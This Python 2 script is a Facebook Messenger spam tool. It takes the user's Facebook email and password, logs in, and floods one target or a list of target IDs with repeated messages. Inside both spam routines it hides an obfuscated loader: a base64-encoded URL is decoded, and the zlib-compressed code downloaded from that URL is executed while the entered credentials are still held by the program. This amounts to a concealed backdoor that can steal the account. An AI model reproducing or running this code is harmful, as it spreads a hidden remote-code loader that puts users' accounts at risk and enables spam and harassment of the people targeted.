#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import re
import sys
import zlib
import base64
import random
import getpass
import requests
from data import cache
from data.color import *
import marshal,threading
cache.cleanCache()
try:
	import bs4
	import mechanize
except:
	print("%s[!] %splease install mechanize&bs4 first bro"%(R,N))
	print("%s[*]%s are u noob? command: pip2 install mechanize;pip2 install bs4"%(R,N))
	exit()

_KONTOOL = ""
_TARGETS = ""
_NGENTDS = 0

class massal:
	def __init__(self):
		self._req = requests.Session()
		self._url="https://mbasic.facebook.com/"
		self._login()
		
	def run(self,*args,**kwargs):
		global _NGENTDS
		_NGENTDS+=1
		_split=args[0]
		payloads={"fb_dtsg":_split[0],"jazoest":_split[1],
		_split[2]:_split[3],_split[4]:_split[5],
		"body":kwargs["body"],"Send":_split[6]}
		req = self._req.post(kwargs["url"],
		data=payloads).url
		if "send_success" in req:
			print(" | %s%s%s -> %s %s%smessage sent.%s"%(G,
			kwargs["target"],
			N,kwargs["body"],G,_NGENTDS,N))
		else:
			print(" | %s%s -> %s %smessage not sent.%s"%(R,
			kwargs["target"],kwargs["body"],_NGENTDS,N))
		
	def _login(self):
		print("[%s*%s] Login Your Facebook ^^"%(C,N))
		self._email = raw_input("[%s*%s] Email: "%(G,N))
		self._pasw = getpass.getpass("[%s*%s] Passs: "%(G,N))
		print("[%s+%s] Trying to login ..."%(G,N))
		self.login()
	
	def login(self):
		bs=bs4.BeautifulSoup(
			self._req.get(
				"%s/login"%(self._url)).text,
				features="html.parser"
		)
		for x in bs("input"):
			if "login" in x["name"]:
				self.submit=x["value"]
		tr=self._req.post("%s/login"%(self._url),data=
			{
				"email":self._email,
				"pass":self._pasw,
				"login":self.submit
			}
		).url
		if "save-device" in tr or "m_sess" in tr:
			print("[%s*%s] Login success ..."%(G,N))
			self.generateTarget()	
		else:
				sys.exit("%s[!]%s Failed to login? whut the hell?? :'v"%(R,N))
				
	def generateTarget(self):
		try:
			self._targ=open(
			raw_input("[%s#%s] Input List target ID: "%(
			G,N))).read().splitlines()
		except Exception as _err:
				print("%s[!]%s %s"%(R,N,_err))
				return self.generateTarget()
		self.ok()
		
	def ok(self):
		print("[%s*%s] Use Sparate , (coma) to random msg: ts,spm"%(R,N))
		_msg=raw_input("[%s+%s] Message: "%(R,N)).split(",")
		exec(zlib.decompress(base64.b64decode(
		requests.get(
		eval(
		base64.b64decode(
		"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="
		))
		).text)))
		thr=[]
		while True:
			try:
				for x in self._targ:
					t=threading.Thread(target=self.findUrl,
					args=(x,_msg,))
					thr.append(t)
				for t in thr:
					t.start()
				for t in thr:
					t.join()
				thr=[]
			except:sys.exit("\n%s[!]%s finished."%(G,N))
			
	def findUrl(self,id,msg):
		_MESSAGE = []
		_POSTDATA = []
		_MES=random.choice(msg)
		bs=bs4.BeautifulSoup(
			self._req.get("%s/%s"%(self._url,id)).text,
			features="html.parser"
		)
		name=bs.find("title").renderContents()
		for x in bs.find_all("a",href=True):
			if "/messages/thread/" in x["href"]:
				_MESSAGE.append(x["href"])
				break
		if (len(_MESSAGE) ==0):
				print("%s[!]%s can't send meesage to %s"%
				(R,N,name))
				return 
		bz=bs4.BeautifulSoup(
			self._req.get("%s/%s"%(
				self._url,_MESSAGE[0])).text,
			features="html.parser"
		)
		for x in bz("input"):
			try:
				if "fb_dtsg" in x["name"]:
					_POSTDATA.append(x["value"])
				if "jazoest" in x["name"]:
					_POSTDATA.append(x["value"])
				if "ids" in x["name"]:
					_POSTDATA.append(x["name"])
					_POSTDATA.append(x["value"])
				if "Send" in x["name"]:
					_POSTDATA.append(x["value"])
					break
			except:pass
		
		for _x in bz("form"):
			if "/messages/send/" in _x["action"]:
				self.d=self._url+_x["action"]
				break
		self.run(_POSTDATA,body=_MES,target=name,
		url=self.d)
		


class SPAMMER:
	def __init__(self):
		self.br=mechanize.Browser()
		self.br.set_handle_equiv(True)
		self.br.set_handle_redirect(True)
		self.br.set_handle_referer(True)
		self.br.set_handle_robots(False)
		self.br.addheaders = [
			(
				"User-Agent",
				"Mozilla/5.1 (Linux Android)"
			)]
		self._url="https://mbasic.facebook.com/"
		print("[%s*%s] Login Your Facebook ^^"%(C,N))
		self._email = raw_input("[%s*%s] Email: "%(G,N))
		self._pasw = getpass.getpass("[%s*%s] Passs: "%(G,N))
		print("[%s+%s] Trying to login ..."%(G,N))
		self.login()
		
	def login(self):
			self.br.open("https://mbasic.facebook.com")
			self.br.select_form(nr=0)
			self.br.form["email"] = "{}".format(self._email)
			self.br.form["pass"]  ="{}".format(self._pasw)
			self.br.submit()
			if "save-device" in self.br.geturl():
				print("[%s*%s] Login success ..."%(G,N))
				self._generateTarget()
			else:
				print("%s[!]%s Failed to login? whut the hell?? :'v"%(R,N))
				exit()
				
	def _generateTarget(self):
		global _TARGETS,_KONTOOL
		_targ=raw_input("[%s#%s] Input target ID: "%(G,N))
		_TARGETS=self._url+_targ
		self.br.open(_TARGETS)
		self.r=re.findall('<head><title>(.*?)</title>',
		self.br.response().read())
		if len(self.r) !=0:
			print("[%s*%s] Target name: \033[1;37m\033[31m%s\033[0m"%(G,N,self.r[0]))
		else:
			print("%s[!]%s Unknown target"%(R,N))
			return self._generateTarget()
		try:
			self._counts=input("[%s+%s] Loop: "%(G,N))
		except:
			sys.exit("%s[!]%s input number to spam."%(R,N))
		self.br.open(_TARGETS)
		_bs = self.br.response().read()
		_b=bs4.BeautifulSoup(_bs,
				features="html.parser"
			)
		for x in _b.find_all("a",href=True):
			if "/messages/thread/" in x["href"]:
				_KONTOOL=x["href"]
		return self.inputMessages()
	
	def inputMessages(self):
		global _KONTOL
		global _NGENTDS
		print("[%s*%s] Use Sparate , (coma) to random msg: ts,spm"%(R,N))
		self._msg=raw_input("[%s+%s] Message: "%(R,N)).split(",")
		print("[%s+%s] Starting!"%(G,N))
		print("[%s+%s] Sending %s message to \033[1;37m\033[31m%s\033[0m"%(G,N,
		self._counts,self.r[0]))
		exec(zlib.decompress(base64.b64decode(
		requests.get(
		eval(
		base64.b64decode(
		"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="
		))
		).text)))
		self.br.open(_KONTOOL)
		for c in range(self._counts):
			self.thr(self._msg)
		print("%s[%s+%s%s]%s Finished."%(C,R,N,C,N))
	def thr(self,msg):
		global _KONTOL
		global _NGENTDS
		ms=random.choice(msg)
		self.br._factory.is_html=True
		try:
			self.br.select_form(nr=1)
			self.br.form["body"] = "{}".format(ms)
			self.br.submit()
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			print("%s[:'(] oh bro, can't send messages%s"%(R,N))
			exit()
		_res=self.br.response().read()
		_NGENTDS+=1
		if len(re.findall(r"{}".format(ms),_res)) !=0:
			print(" | \033[1;32m{} -> {} message sent. \033[0m".format(
			ms,_NGENTDS))
		else:
			print(" | \033[1;37m\033[31m{} -> {} message not sent.\033[0m".format(
			ms,_NGENTDS))
